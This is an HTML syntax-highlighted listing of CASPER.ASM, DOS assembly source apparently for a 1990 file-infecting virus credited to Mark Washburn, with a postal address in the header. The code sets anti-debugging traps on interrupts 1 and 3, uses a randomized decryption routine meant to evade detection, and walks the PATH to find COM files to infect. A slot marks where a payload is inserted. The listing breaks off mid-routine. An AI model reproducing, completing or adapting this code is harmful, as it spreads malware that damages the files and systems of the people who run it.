<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>CASPER.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Copyright (C) Mark Washburn, 1990.  All Rights Reserved</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Inquires are directed to :</span><span class="sc0">
</span><span class="sc1">; Mark Washburn</span><span class="sc0">
</span><span class="sc1">; 4656 Polk Street NE</span><span class="sc0">
</span><span class="sc1">; Columbia Heights, MN 55421</span><span class="sc0">
</span><span class="sc1">; USA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;stopdebug       equ 1 ; define this for disassembly trap code</span><span class="sc0">
</span><span class="sc5">int1vec</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">int3vec</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">dta_ptr</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">file_crea</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">path_start_ptr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">file_start_ptr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">RAND_SEED</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">ptr1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">18</span><span class="sc0"> </span><span class="sc1">; pointer to start of loop code</span><span class="sc0">
</span><span class="sc5">ptr2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20</span><span class="sc0"> </span><span class="sc1">; save data_begin pointer</span><span class="sc0">
</span><span class="sc5">dat1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">22</span><span class="sc0"> </span><span class="sc1">; the random code used</span><span class="sc0">
</span><span class="sc5">dat2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">24</span><span class="sc0"> </span><span class="sc1">; the decode length plus random length offset, max_msk</span><span class="sc0">
                        </span><span class="sc1">; to make the decode routine more difficult to detect</span><span class="sc0">
</span><span class="sc5">dat3</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">26</span><span class="sc0"> </span><span class="sc1">; the 'necessary crypt code' mask</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
</span><span class="sc5">local_stack</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">
</span><span class="sc5">max_msk</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; this determines the maximum variance of length</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">nobugptr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">28</span><span class="sc0">
</span><span class="sc5">oldint3</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">oldint1</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">local_stack</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">max_msk</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; this determines the maximum variance of length</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">doscall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">call_type</span><span class="sc0">
                </span><span class="sc9">ifnb</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">call_type</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">call_type</span><span class="sc0">
                </span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">setloc</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">arg1</span><span class="sc4">,</span><span class="sc5">reg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">arg1</span><span class="sc4">],</span><span class="sc5">reg2</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getloc</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc5">arg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reg1</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">arg2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">setdat</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">arg1</span><span class="sc4">,</span><span class="sc5">reg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">arg1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">],</span><span class="sc5">reg2</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getdat</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc5">arg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reg1</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">arg2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">regofs</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc5">arg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">arg2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NOBUG1</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">nobug2</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0"> </span><span class="sc1">; program code</span><span class="sc0">
</span><span class="sc1">;                db      600h-6 dup (0)</span><span class="sc0">
</span><span class="sc1">; insert utility code here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">entry</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">precrypt</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">36</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">090h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; calculated length of offset(t41-t10)</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">39</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">090h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; calculated length of offset(t41-t10)</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; label the start of encoded section</span><span class="sc0">
</span><span class="sc5">entry2</span><span class="sc4">:</span><span class="sc0">






</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">utility.asm</span><span class="sc0">         </span><span class="sc4">&lt;-------</span><span class="sc0"> </span><span class="sc5">Manipulation</span><span class="sc0"> </span><span class="sc5">Task</span><span class="sc0"> </span><span class="sc5">Goes</span><span class="sc0"> </span><span class="sc5">Here</span><span class="sc0">!







        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">   </span><span class="sc1">; allocate locals</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">local_stack</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">movcmd</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; this label is used to locate the next instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">ptr2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; save - will be modified in 'gencode'</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; save interrupt 1 and 3 vectors</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">oldint1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">oldint1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">oldint3</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">oldint3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bugon</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc1">; check DOS version</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cont1</span><span class="sc0"> </span><span class="sc1">; DOS &gt; 2.0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">
</span><span class="sc5">cont1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0"> </span><span class="sc1">; get program DTA</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 0</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">dta_ptr</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 0</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">dta_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">my_dta</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc1">; set new DTA</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; environment address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">loop1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">path_chars</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8000h</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">loop2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loop1</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">path_start_ptr</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">file_name</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cont6</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">next_path</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_start_ptr</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cont3</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit2</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">cont3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">002ch</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">path_start_ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">file_name</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">loop3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">';'</span><span class="sc0"> </span><span class="sc1">; 3bh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">cont4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">cont5</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">loop3</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">cont5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cont4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">path_start_ptr</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">cont6</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\' ; 5ch
</span><span class="sc0">                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">cont6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">file_start_ptr</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_search</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cont7</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">next_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">04fh</span><span class="sc0">
</span><span class="sc5">cont7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">cont8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_path</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">cont8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">my_dta</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)+</span><span class="sc2">016h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; low time byte</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
